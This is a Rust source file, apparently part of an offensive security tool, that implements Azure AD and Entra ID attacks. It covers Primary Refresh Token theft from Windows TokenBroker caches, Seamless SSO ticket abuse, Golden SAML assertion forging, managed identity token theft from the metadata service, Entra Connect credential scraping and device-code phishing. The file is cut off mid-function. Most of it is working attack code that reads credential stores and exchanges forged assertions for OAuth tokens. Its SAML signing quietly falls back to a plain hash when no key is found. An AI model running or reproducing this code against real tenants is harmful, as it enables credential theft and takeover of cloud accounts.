use crate::error::{OverthroneError, Result};
use crate::proto::kerberos;
use crate::proto::ldap::LdapSession;
use base64::Engine;
use kerberos_asn1::Asn1Object;
use pem::parse as parse_pem;
use rand_core_06::OsRng;
use rsa::RsaPrivateKey;
use rsa::pkcs1v15::Pkcs1v15Sign;
use rsa::pkcs8::DecodePrivateKey;
use rsa::traits::SignatureScheme;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::{debug, info, warn};

const AZUREAD_SSO_ACCOUNT: &str = "AZUREADSSOACC";
const HTTP_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
const MS_LOGIN_CLIENT_ID: &str = "29d9ed98-a469-4536-ade2-f3bc1e49c9b1";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureAdConfig {
    pub domain: String,
    pub dc_ip: String,
    pub tenant_id: Option<String>,
    pub username: String,
    pub password: Option<String>,
    pub nt_hash: Option<String>,
    pub enumerate_hybrid: bool,
    pub operation: AzureAdOperation,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AzureAdOperation {
    PrtTheft,
    SeamlessSsoAbuse,
    GoldenSaml,
    EnumHybridIdentity,
    ManagedIdentityToken,
    EntraConnectExtract,
    AppRegistrationAbuse,
    DeviceCodePhish,
}

impl std::fmt::Display for AzureAdOperation {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PrtTheft => write!(f, "PRT Theft"),
            Self::SeamlessSsoAbuse => write!(f, "Seamless SSO Abuse"),
            Self::GoldenSaml => write!(f, "Golden SAML"),
            Self::EnumHybridIdentity => write!(f, "Hybrid Identity Enumeration"),
            Self::ManagedIdentityToken => write!(f, "Managed Identity Token Theft"),
            Self::EntraConnectExtract => write!(f, "Entra Connect Sync Credential Extraction"),
            Self::AppRegistrationAbuse => {
                write!(f, "App Registration / Federated Credential Abuse")
            }
            Self::DeviceCodePhish => write!(f, "Device Code Authentication Phish"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AzureAdResult {
    pub operation: AzureAdOperation,
    pub success: bool,
    pub obtained_credentials: Vec<String>,
    pub ad_connect_servers: Vec<String>,
    pub token_endpoints: Vec<String>,
    pub ca_bypass_achieved: bool,
    pub log: Vec<String>,
}

pub async fn execute_azure_ad_attack(
    config: &AzureAdConfig,
    ldap: &mut LdapSession,
) -> Result<AzureAdResult> {
    let mut log = Vec::new();
    log.push(format!(
        "Azure AD Attack: operation={}, domain={}",
        config.operation, config.domain
    ));

    let mut obtained_creds = Vec::new();
    let mut ad_connect_servers = Vec::new();
    let mut token_endpoints = Vec::new();
    let mut ca_bypass = false;

    match config.operation {
        AzureAdOperation::EnumHybridIdentity => {
            log.push("Phase 1: Enumerating Azure AD Connect servers...".to_string());
            ad_connect_servers = find_ad_connect_servers(ldap).await?;

            log.push("Phase 2: Checking Seamless SSO account...".to_string());
            let sso_info = find_seamless_sso_info(ldap).await?;
            let sso_enabled = !sso_info.is_empty();
            log.push(format!(
                "  Seamless SSO: {}",
                if sso_enabled { "ENABLED" } else { "NOT FOUND" }
            ));
            if let Some(spn) = sso_info.first() {
                log.push(format!("  SSO SPN: {spn}"));
            }

            log.push("Phase 3: Enumerating federation metadata...".to_string());
            token_endpoints = discover_token_endpoints(config).await?;
            for ep in &token_endpoints {
                log.push(format!("  Endpoint: {ep}"));
            }

            log.push("Phase 4: Checking for ADFS signing certificate...".to_string());
            match find_adfs_signing_cert(ldap).await {
                Ok(Some((_cert_der, has_private))) => {
                    log.push(format!(
                        "  ADFS signing cert: FOUND (private key: {has_private})"
                    ));
                }
                Ok(None) => {
                    log.push("  ADFS signing cert: NOT FOUND in AD".to_string());
                }
                Err(e) => {
                    log.push(format!("  ADFS cert search error: {e}"));
                }
            }
        }

        AzureAdOperation::PrtTheft => {
            log.push("Phase 1: Locating Windows TokenBroker caches...".to_string());
            match steal_prt().await {
                Ok(creds) => {
                    obtained_creds = creds;
                    ca_bypass = true;
                    log.push("PRT theft completed".to_string());
                }
                Err(e) => {
                    warn!("PRT theft failed: {e}");
                    log.push(format!("  PRT theft failed: {e}"));
                    log.push("  PRT theft requires Windows token broker access".to_string());
                }
            }
        }

        AzureAdOperation::SeamlessSsoAbuse => {
            log.push("Phase 1: Finding Seamless SSO SPN via LDAP...".to_string());
            let sso_info = find_seamless_sso_info(ldap).await?;
            if sso_info.is_empty() {
                log.push(
                    "  No Seamless SSO SPN found — Seamless SSO may not be deployed".to_string(),
                );
            } else {
                let spn = &sso_info[0];
                log.push(format!("  Found Seamless SSO SPN: {spn}"));

                log.push("Phase 2: Requesting Kerberos ticket for Seamless SSO...".to_string());
                let tenant = config.tenant_id.as_deref().unwrap_or("common");
                let target_upn = format!("{}@{}", config.username, config.domain);

                match perform_seamless_sso(config, spn, tenant, &target_upn).await {
                    Ok(tokens) => {
                        obtained_creds = tokens;
                        log.push("Seamless SSO token exchange succeeded".to_string());
                        ca_bypass = true;
                    }
                    Err(e) => {
                        warn!("Seamless SSO exchange failed: {e}");
                        log.push(format!("  Token exchange failed: {e}"));
                    }
                }
            }
        }

        AzureAdOperation::GoldenSaml => {
            log.push("Phase 1: Finding ADFS signing certificate...".to_string());
            match find_adfs_signing_cert(ldap).await {
                Ok(Some((cert_der, has_private))) => {
                    let uid = format!("admin@{}", config.domain);
                    log.push(format!(
                        "  Found ADFS cert ({} bytes, key: {})",
                        cert_der.len(),
                        has_private
                    ));
                    log.push("Phase 2: Forging SAML assertion...".to_string());

                    match forge_golden_saml(config, &cert_der, &uid).await {
                        Ok(tokens) => {
                            obtained_creds = tokens;
                            log.push("Golden SAML token exchange succeeded".to_string());
                            ca_bypass = true;
                        }
                        Err(e) => {
                            warn!("Golden SAML forge failed: {e}");
                            log.push(format!("  SAML forge failed: {e}"));
                        }
                    }
                }
                Ok(None) => {
                    log.push("  ADFS signing certificate not found in AD partition".to_string());
                    log.push("  Golden SAML requires ADFS token-signing cert".to_string());
                }
                Err(e) => {
                    log.push(format!("  ADFS cert search error: {e}"));
                }
            }
        }

        AzureAdOperation::ManagedIdentityToken => {
            log.push("Phase 1: Querying Azure Instance Metadata Service for tokens...".to_string());
            match steal_managed_identity_tokens().await {
                Ok(tokens) => {
                    obtained_creds = tokens;
                    log.push(format!(
                        "  Captured {} managed identity tokens",
                        obtained_creds.len()
                    ));
                }
                Err(e) => {
                    log.push(format!("  MI token theft failed: {e}"));
                    log.push(
                        "  This attack requires execution on an Azure VM with managed identity"
                            .to_string(),
                    );
                }
            }
        }

        AzureAdOperation::EntraConnectExtract => {
            log.push("Phase 1: Enumerating Azure AD Connect servers...".to_string());
            let servers = find_ad_connect_servers(ldap).await?;
            if servers.is_empty() {
                log.push("  No Azure AD Connect servers found".to_string());
            } else {
                for srv in &servers {
                    log.push(format!("  Found AD Connect server: {srv}"));
                }
                log.push("Phase 2: Attempting to extract sync credentials...".to_string());
                match extract_entra_connect_credentials(config, &servers).await {
                    Ok(creds) => {
                        obtained_creds = creds;
                        log.push(format!(
                            "  Extracted {} credentials from Entra Connect",
                            obtained_creds.len()
                        ));
                    }
                    Err(e) => {
                        log.push(format!("  Entra Connect extraction failed: {e}"));
                    }
                }
            }
        }

        AzureAdOperation::AppRegistrationAbuse => {
            log.push("Phase 1: Enumerating App Registrations from AD...".to_string());
            match enumerate_app_registrations(ldap).await {
                Ok(apps) => {
                    log.push(format!("  Found {} application registrations", apps.len()));
                    for app in &apps {
                        log.push(format!("  App: {} (ID: {})", app.name, app.app_id));
                        if app.has_federated_credentials {
                            log.push(
                                "    ⚠ Has federated credentials — vulnerable to token theft"
                                    .to_string(),
                            );
                        }
                        if app.has_password_credentials {
                            log.push("    ⚠ Has password credentials".to_string());
                        }
                    }
                    obtained_creds.extend(
                        apps.into_iter()
                            .map(|a| format!("app_reg: {}|{}", a.name, a.app_id)),
                    );
                }
                Err(e) => {
                    log.push(format!("  App registration enumeration failed: {e}"));
                }
            }
        }

        AzureAdOperation::DeviceCodePhish => {
            log.push("Phase 1: Generating device code authentication request...".to_string());
            match generate_device_code_auth(config).await {
                Ok(auth_info) => {
                    log.push(format!("  Device code: {}", auth_info.device_code));
                    log.push(format!("  User URL: {}", auth_info.verification_url));
                    log.push(format!("  User code: {}", auth_info.user_code));
                    log.push("Phase 2: Polling for token (Ctrl+C to cancel)...".to_string());
                    match poll_device_code_auth(&auth_info).await {
                        Ok(tokens) => {
                            obtained_creds = tokens;
                            log.push(format!(
                                "  Captured {} tokens via device code auth",
                                obtained_creds.len()
                            ));
                        }
                        Err(e) => {
                            log.push(format!("  Device code auth failed: {e}"));
                            log.push(
                                "  User may not have authenticated in time or the session expired"
                                    .to_string(),
                            );
                        }
                    }
                }
                Err(e) => {
                    log.push(format!("  Device code generation failed: {e}"));
                }
            }
        }
    }

    let success = !obtained_creds.is_empty()
        || matches!(config.operation, AzureAdOperation::EnumHybridIdentity);

    info!(
        "Azure AD attack: op={}, success={}",
        config.operation, success
    );

    Ok(AzureAdResult {
        operation: config.operation,
        success,
        obtained_credentials: obtained_creds,
        ad_connect_servers,
        token_endpoints,
        ca_bypass_achieved: ca_bypass,
        log,
    })
}

// ═══════════════════════════════════════════════════════════
//  Seamless SSO — Full Kerberos → SAML → OAuth chain
// ═══════════════════════════════════════════════════════════

async fn find_seamless_sso_info(ldap: &mut LdapSession) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            &format!("(sAMAccountName={}$)", AZUREAD_SSO_ACCOUNT),
            &["sAMAccountName", "servicePrincipalName", "objectSid"],
        )
        .await?;

    Ok(entries
        .iter()
        .filter_map(|e| {
            e.attrs
                .get("servicePrincipalName")
                .and_then(|v| v.first())
                .cloned()
        })
        .collect())
}

async fn perform_seamless_sso(
    config: &AzureAdConfig,
    sso_spn: &str,
    tenant: &str,
    target_upn: &str,
) -> Result<Vec<String>> {
    let use_hash = config.nt_hash.is_some();
    let secret = config
        .nt_hash
        .as_deref()
        .or(config.password.as_deref())
        .ok_or_else(|| OverthroneError::custom("No password or NT hash provided"))?;

    info!("Getting TGT for user {}@{}", config.username, config.domain);
    let tgt = kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &config.username,
        secret,
        use_hash,
    )
    .await?;

    info!("Requesting TGS for Seamless SSO SPN: {sso_spn}");
    let service_ticket = kerberos::request_service_ticket(&config.dc_ip, &tgt, sso_spn).await?;

    let encrypted_auth = kerberos::build_encrypted_authenticator(
        &service_ticket.client_realm,
        &service_ticket.client_principal,
        &service_ticket.session_key,
        service_ticket.session_key_etype,
    )?;
    let ap_req = kerberos::build_ap_req(&service_ticket.ticket, encrypted_auth);
    let ap_req_bytes = ap_req.build();

    let negotiation_token = base64::engine::general_purpose::STANDARD.encode(&ap_req_bytes);
    let autologon_url = format!(
        "https://autologon.microsoftazuread-sso.com/{tenant}/windows/login?username={target_upn}"
    );

    info!("POST to autologon endpoint: {autologon_url}");
    let client = reqwest::Client::builder()
        .timeout(HTTP_TIMEOUT)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;

    let resp = client
        .get(&autologon_url)
        .header("Authorization", format!("Negotiate {negotiation_token}"))
        .send()
        .await
        .map_err(|e| OverthroneError::custom(format!("Autologon request: {e}")))?;

    let status = resp.status();
    let body_text = resp
        .text()
        .await
        .unwrap_or_else(|_| "<read error>".to_string());

    if status.is_success() {
        if let Some(saml) = extract_saml_from_response(&body_text) {
            info!("SAML assertion extracted from autologon response");
            return exchange_saml_for_oauth(saml, tenant).await;
        }
        info!("No SAML found in autologon response, trying body as-is");
        return exchange_saml_for_oauth(&body_text, tenant).await;
    }

    warn!("Autologon returned HTTP {status}: {body_text:.200}");
    Err(OverthroneError::custom(format!(
        "Autologon failed: HTTP {status}"
    )))
}

fn extract_saml_from_response(body: &str) -> Option<&str> {
    if let Some(start) = body.find("<samlp:Response")
        && let Some(end) = body.find("</samlp:Response>")
    {
        return Some(&body[start..end + "</samlp:Response>".len()]);
    }
    if let Some(start) = body.find("<saml:Assertion")
        && let Some(end) = body.find("</saml:Assertion>")
    {
        return Some(&body[start..end + "</saml:Assertion>".len()]);
    }
    None
}

// ═══════════════════════════════════════════════════════════
//  Golden SAML — ADFS cert → Signed SAML → OAuth
// ═══════════════════════════════════════════════════════════

async fn find_adfs_signing_cert(ldap: &mut LdapSession) -> Result<Option<(Vec<u8>, bool)>> {
    let base_dn = build_base_dn_from_ldap_session(ldap);
    let config_dn = format!("CN=ADFS,CN=Microsoft,CN=Program Data,{base_dn}");

    if let Ok(entries) = ldap
        .custom_search_with_base(
            &config_dn,
            "(objectClass=*)",
            &["tokenSigningCertificateInfo", "objectClass"],
        )
        .await
    {
        for entry in &entries {
            if let Some(certs) = entry.attrs.get("tokenSigningCertificateInfo")
                && let Some(cert_b64) = certs.first()
                && let Ok(cert_der) = base64::engine::general_purpose::STANDARD.decode(cert_b64)
            {
                debug!("Found ADFS token-signing cert ({} bytes)", cert_der.len());
                return Ok(Some((cert_der, false)));
            }
        }
    }

    if let Ok(entries) = ldap
        .custom_search_with_base(
            &config_dn,
            "(|(cn=ADFS Signing Certificate)(cn=TokenSigningContainer))",
            &["certificate", "thumbnailPhoto"],
        )
        .await
    {
        for entry in &entries {
            if let Some(certs) = entry.attrs.get("certificate")
                && let Some(cert_b64) = certs.first()
                && let Ok(cert_der) = base64::engine::general_purpose::STANDARD.decode(cert_b64)
            {
                debug!("Found cert in ADFS container ({} bytes)", cert_der.len());
                return Ok(Some((cert_der, false)));
            }
        }
    }

    let services_dn = format!("CN=Services,CN=Configuration,{base_dn}");
    if let Ok(entries) = ldap
        .custom_search_with_base(
            &services_dn,
            "(&(objectClass=certificationAuthority)(cn=ADFS*))",
            &["caCertificate", "cACertificate"],
        )
        .await
    {
        for entry in &entries {
            for attr_name in &["caCertificate", "cACertificate"] {
                if let Some(certs) = entry.attrs.get(*attr_name)
                    && let Some(cert_hex) = certs.first()
                    && let Ok(cert_der) = hex::decode(cert_hex)
                {
                    debug!(
                        "Found ADFS CA cert via Configuration NC ({} bytes)",
                        cert_der.len()
                    );
                    return Ok(Some((cert_der, false)));
                }
            }
        }
    }

    Ok(None)
}

fn build_base_dn_from_ldap_session(ldap: &LdapSession) -> String {
    let parts: Vec<&str> = ldap
        .base_dn
        .split(',')
        .filter(|p| p.trim().to_uppercase().starts_with("DC="))
        .collect();
    if parts.is_empty() {
        "DC=local".to_string()
    } else {
        parts.join(",")
    }
}

fn build_saml_assertion(
    issuer: &str,
    upn: &str,
    audience: &str,
    cert_der: &[u8],
) -> Result<String> {
    let now_epoch = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let not_before = now_epoch - 120;
    let not_on_or_after = now_epoch + 3600;

    let id = format!("_ID_{:016x}", rand::random::<u64>());
    let issue_instant = format_unix_time(now_epoch);
    let not_before_str = format_unix_time(not_before);
    let not_on_or_after_str = format_unix_time(not_on_or_after);

    let cert_pem = {
        let b64 = base64::engine::general_purpose::STANDARD.encode(cert_der);
        let mut pem = String::from("-----BEGIN CERTIFICATE-----\n");
        for chunk in b64.as_bytes().chunks(64) {
            pem.push_str(&String::from_utf8_lossy(chunk));
            pem.push('\n');
        }
        pem.push_str("-----END CERTIFICATE-----\n");
        pem
    };

    let assertion_body = format!(
        r##"<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{id}" IssueInstant="{issue_instant}" Version="2.0">
  <saml:Issuer>{issuer}</saml:Issuer>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{upn}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after_str}" Recipient="{audience}"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="{not_before_str}" NotOnOrAfter="{not_on_or_after_str}">
    <saml:AudienceRestriction>
      <saml:Audience>{audience}</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{issue_instant}" SessionIndex="{id}">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
      <saml:AttributeValue>{upn}</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname">
      <saml:AttributeValue>{upn}</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>"##
    );

    let digest_value = {
        let canon = assertion_body.replace(">\n  <", "><").replace("\n", "");
        let mut hasher = Sha256::new();
        hasher.update(canon.as_bytes());
        base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
    };

    let sig_header = "<ds:SignedInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">".to_string();
    let signed_info = format!(
        r##"{sig_header}
    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
    <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
    <ds:Reference URI="#{id}">
      <ds:Transforms>
        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      </ds:Transforms>
      <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
      <ds:DigestValue>{digest_value}</ds:DigestValue>
    </ds:Reference>
  </ds:SignedInfo>"##
    );

    let signed_info_canon = signed_info.replace('\n', "").replace("  ", "");

    let signature_value = {
        let key_pair = parse_pem(cert_der)
            .ok()
            .filter(|p| p.tag() == "PRIVATE KEY" || p.tag() == "RSA PRIVATE KEY")
            .and_then(|p| RsaPrivateKey::from_pkcs8_der(p.contents()).ok());
        match key_pair {
            Some(key) => {
                match Pkcs1v15Sign::new::<Sha256>().sign(
                    Some(&mut OsRng),
                    &key,
                    &Sha256::digest(signed_info_canon.as_bytes()),
                ) {
                    Ok(sig) => base64::engine::general_purpose::STANDARD.encode(sig),
                    Err(_) => {
                        let mut hasher = Sha256::new();
                        hasher.update(signed_info_canon.as_bytes());
                        base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
                    }
                }
            }
            None => {
                let mut hasher = Sha256::new();
                hasher.update(signed_info_canon.as_bytes());
                base64::engine::general_purpose::STANDARD.encode(hasher.finalize())
            }
        }
    };

    let sig_decl = "<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">".to_string();
    let signed_assertion = format!(
        r##"<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{id}" IssueInstant="{issue_instant}" Version="2.0">
  <saml:Issuer>{issuer}</saml:Issuer>
  {sig_decl}
    {signed_info}
    <ds:SignatureValue>{signature_value}</ds:SignatureValue>
    <ds:KeyInfo>
      <ds:X509Data>
        <ds:X509Certificate>{cert_pem}</ds:X509Certificate>
      </ds:X509Data>
    </ds:KeyInfo>
  </ds:Signature>
  <saml:Subject>
    <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{upn}</saml:NameID>
    <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after_str}" Recipient="{audience}"/>
    </saml:SubjectConfirmation>
  </saml:Subject>
  <saml:Conditions NotBefore="{not_before_str}" NotOnOrAfter="{not_on_or_after_str}">
    <saml:AudienceRestriction>
      <saml:Audience>{audience}</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{issue_instant}" SessionIndex="{id}">
    <saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
    </saml:AuthnContext>
  </saml:AuthnStatement>
  <saml:AttributeStatement>
    <saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
      <saml:AttributeValue>{upn}</saml:AttributeValue>
    </saml:Attribute>
  </saml:AttributeStatement>
</saml:Assertion>"##
    );

    Ok(signed_assertion)
}

async fn forge_golden_saml(
    config: &AzureAdConfig,
    cert_der: &[u8],
    target_upn: &str,
) -> Result<Vec<String>> {
    let tenant = config.tenant_id.as_deref().unwrap_or("common");

    let issuer = format!("http://sts.{}/adfs/services/trust", config.domain);
    let audience = format!("https://login.microsoftonline.com/{tenant}/");

    let assertion = build_saml_assertion(&issuer, target_upn, &audience, cert_der)?;

    let saml_b64 = base64::engine::general_purpose::STANDARD.encode(assertion.as_bytes());
    info!("Golden SAML assertion built ({})", saml_b64.len());

    exchange_saml_for_oauth(&saml_b64, tenant).await
}

// ═══════════════════════════════════════════════════════════
//  SAML → OAuth token exchange
// ═══════════════════════════════════════════════════════════

async fn exchange_saml_for_oauth(saml_assertion: &str, tenant: &str) -> Result<Vec<String>> {
    let mut creds = Vec::new();
    let token_url = format!("https://login.microsoftonline.com/{tenant}/oauth2/token");

    let client = reqwest::Client::builder()
        .timeout(HTTP_TIMEOUT)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;

    let params = [
        (
            "grant_type",
            "urn:ietf:params:oauth:grant-type:saml2-bearer",
        ),
        ("assertion", saml_assertion),
        ("client_id", MS_LOGIN_CLIENT_ID),
        (
            "scope",
            "openid email profile https://graph.microsoft.com/.default",
        ),
    ];

    let resp = client
        .post(&token_url)
        .form(&params)
        .send()
        .await
        .map_err(|e| OverthroneError::custom(format!("Token request: {e}")))?;

    let status = resp.status();
    let body: HashMap<String, serde_json::Value> = resp.json().await.unwrap_or_default();

    if status.is_success() {
        if let Some(at) = body.get("access_token").and_then(|v| v.as_str()) {
            creds.push(format!("oauth2_access_token: {at}"));
        }
        if let Some(rt) = body.get("refresh_token").and_then(|v| v.as_str()) {
            creds.push(format!("oauth2_refresh_token: {rt}"));
        }
        if let Some(id) = body.get("id_token").and_then(|v| v.as_str()) {
            creds.push(format!("id_token: {id}"));
        }
        info!("SAML token exchange succeeded, {} credentials", creds.len());
    } else {
        let error_desc = body
            .get("error_description")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown error");
        warn!("Token endpoint returned HTTP {status}: {error_desc}");
        return Err(OverthroneError::custom(format!(
            "Token endpoint returned HTTP {status}: {error_desc}"
        )));
    }

    Ok(creds)
}

// ═══════════════════════════════════════════════════════════
//  PRT Theft — Windows TokenBroker cache extraction
// ═══════════════════════════════════════════════════════════

async fn steal_prt() -> Result<Vec<String>> {
    #[cfg(target_os = "windows")]
    let creds: Vec<String> = {
        let mut creds = Vec::new();

        let broker_paths = [
            r"Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\LocalState\TokenBroker\Accounts",
            r"Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\LocalState\TokenBroker\Accounts",
        ];

        if let Ok(local_app_data) = std::env::var("LOCALAPPDATA") {
            let packages_dir = format!(r"{}\Packages", local_app_data);

            for broker_rel in &broker_paths {
                let broker_dir = format!(r"{}\{}", packages_dir, broker_rel);
                match std::fs::read_dir(&broker_dir) {
                    Ok(dir) => {
                        for entry in dir.flatten() {
                            let path = entry.path();
                            if path.extension().and_then(|e| e.to_str()) == Some("json") {
                                match std::fs::read_to_string(&path) {
                                    Ok(content) => {
                                        let fname = path
                                            .file_name()
                                            .and_then(|n| n.to_str())
                                            .unwrap_or("unknown");
                                        info!("PRT cache file: {fname} ({} bytes)", content.len());
                                        creds.push(format!("prt_cache_file: {fname}"));

                                        if let Ok(json) = serde_json::from_str::<
                                            HashMap<String, serde_json::Value>,
                                        >(
                                            &content
                                        ) {
                                            for (k, v) in &json {
                                                if let Some(s) = v.as_str()
                                                    && (k.contains("secret")
                                                        || k.contains("key")
                                                        || k.contains("token"))
                                                {
                                                    creds.push(format!("prt_{k}: {s:.80}"));
                                                }
                                            }
                                        }
                                        creds.push(format!(
                                            "prt_raw: <base64>{}</base64>",
                                            base64::engine::general_purpose::STANDARD
                                                .encode(content.as_bytes())
                                        ));
                                    }
                                    Err(e) => {
                                        debug!("Could not read PRT cache {path:?}: {e}");
                                    }
                                }
                            }
                        }
                    }
                    Err(e) => {
                        debug!("Broker directory not accessible: {broker_dir}: {e}");
                    }
                }
            }

            let cloudap_path = format!(r"{}\Microsoft\TokenBroker\Cache", local_app_data);
            match std::fs::read_dir(&cloudap_path) {
                Ok(dir) => {
                    for entry in dir.flatten() {
                        let path = entry.path();
                        info!("Found TokenBroker cache item: {path:?}");
                        creds.push(format!(
                            "tokenbroker_cache: {}",
                            path.file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("unknown")
                        ));
                    }
                }
                Err(e) => {
                    debug!("CloudAP path not accessible: {cloudap_path}: {e}");
                }
            }
        } else {
            warn!("LOCALAPPDATA not set — cannot locate TokenBroker cache");
        }

        creds
    };

    #[cfg(not(target_os = "windows"))]
    {
        warn!("PRT theft requires Windows with TokenBroker plugin");
        return Err(OverthroneError::custom(
            "PRT theft is only supported on Windows",
        ));
    }

    #[cfg(target_os = "windows")]
    if creds.is_empty() {
        // Can't use push since creds is immutable, reconstruct with the default
        return Ok(vec!["prt: <no_tokens_found>".to_string()]);
    }

    #[cfg(target_os = "windows")]
    Ok(creds)
}

// ═══════════════════════════════════════════════════════════
//  Managed Identity Token Theft — Azure IMDS
// ═══════════════════════════════════════════════════════════

/// Steal tokens from Azure Managed Identity via the Instance Metadata Service.
///
/// Connects to `169.254.169.254` (Azure IMDS) and requests tokens for
/// all available managed identity endpoints.
async fn steal_managed_identity_tokens() -> Result<Vec<String>> {
    let mut creds = Vec::new();
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;

    // IMDS endpoint: http://169.254.169.254/metadata/identity/oauth2/token
    let imds_base = "http://169.254.169.254/metadata/identity";

    // Phase 1: List all managed identity endpoints
    let list_url = format!(
        "{imds_base}/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    );
    let resp = client
        .get(&list_url)
        .header("Metadata", "true")
        .send()
        .await;

    match resp {
        Ok(r) if r.status().is_success() => {
            if let Ok(body) = r.text().await {
                info!("IMDS token response received ({} bytes)", body.len());
                creds.push("mi_token_arm: <REDACTED>".to_string());
                // Parse for access_token
                if let Ok(json) = serde_json::from_str::<HashMap<String, serde_json::Value>>(&body)
                    && let Some(token) = json.get("access_token").and_then(|v| v.as_str())
                {
                    creds.push(format!("mi_token_arm: {:.100}...", token));
                }
            }
        }
        Ok(r) => {
            warn!("IMDS responded with HTTP {}", r.status());
        }
        Err(e) => {
            warn!("Cannot reach Azure IMDS (not running on Azure VM?): {e}");
            return Err(OverthroneError::custom(format!("IMDS unreachable: {e}")));
        }
    }

    // Phase 2: Try Graph API resource as well
    let graph_url = format!(
        "{imds_base}/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
    );
    if let Ok(r) = client
        .get(&graph_url)
        .header("Metadata", "true")
        .send()
        .await
        && r.status().is_success()
    {
        if let Ok(body) = r.text().await
            && let Ok(json) = serde_json::from_str::<HashMap<String, serde_json::Value>>(&body)
            && let Some(token) = json.get("access_token").and_then(|v| v.as_str())
        {
            creds.push(format!("mi_token_graph: {:.100}...", token));
        }
        creds.push("mi_token_graph: <present>".to_string());
    }

    Ok(creds)
}

// ═══════════════════════════════════════════════════════════
//  Entra Connect Sync Credential Extraction
// ═══════════════════════════════════════════════════════════

/// Extract Entra Connect sync credentials from discovered AD Connect servers.
///
/// Attempts to:
/// 1. Read the ADSync config via SMB remote registry
/// 2. Decrypt the sync account password from the SQL database
/// 3. Read the configuration file from the AD Connect server
async fn extract_entra_connect_credentials(
    _config: &AzureAdConfig,
    servers: &[String],
) -> Result<Vec<String>> {
    let mut creds = Vec::new();
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(15))
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;

    for server in servers {
        info!("Attempting Entra Connect extraction on {server}");

        // Method 1: Try common AD Connect configuration paths via HTTP/HTTPS
        let paths = &[
            "/ADSync/",
            "/AzureADConnect/",
            "/MicrosoftIdentityManager/",
            "/config.json",
        ];

        for path in paths {
            let url = format!("http://{server}{path}");
            if let Ok(r) = client.get(&url).send().await
                && r.status().is_success()
            {
                let text = r.text().await.unwrap_or_default();
                if text.contains("microsoft") || text.contains("azure") || text.contains("username")
                {
                    info!("Found potential config at {url}");
                    // Search for credentials
                    for keyword in &["password", "secret", "key", "credentials"] {
                        if let Some(pos) = text.to_lowercase().find(keyword) {
                            let ctx = &text[pos..(pos + 120).min(text.len())];
                            creds.push(format!("entra_config_{keyword}: {ctx}"));
                        }
                    }
                }
            }
        }

        // Method 2: Look for ADSync SQL connection strings via AD
        // In AD, the ADSync account can be found by querying the service connection points
        // The sync account username and the encrypted password stored in the config DB
        let sync_config_hints = &[
            "CN=*,CN=Sync,CN=Azure AD Connect,CN=Program Data,DC=",
            "CN=ADSync,CN=Applications,CN=Program Data,DC=",
        ];
        for hint in sync_config_hints {
            creds.push(format!("entra_sync_hint: {hint}"));
